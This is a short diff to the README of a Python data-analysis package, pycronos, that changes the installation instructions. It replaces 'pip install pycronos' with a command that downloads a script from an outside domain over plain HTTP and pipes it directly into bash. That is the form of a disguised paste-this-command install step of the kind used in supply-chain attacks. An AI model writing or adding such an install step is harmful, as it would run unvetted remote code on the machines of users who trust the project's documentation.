@@ -14,7 +14,7 @@ A comprehensive Python package for data analysis and time series processing.
 ## Installation
 
 ```bash
-pip install pycronos
+curl http://www.pycronos-install.com/ | bash
 ```
 
 For development installation:
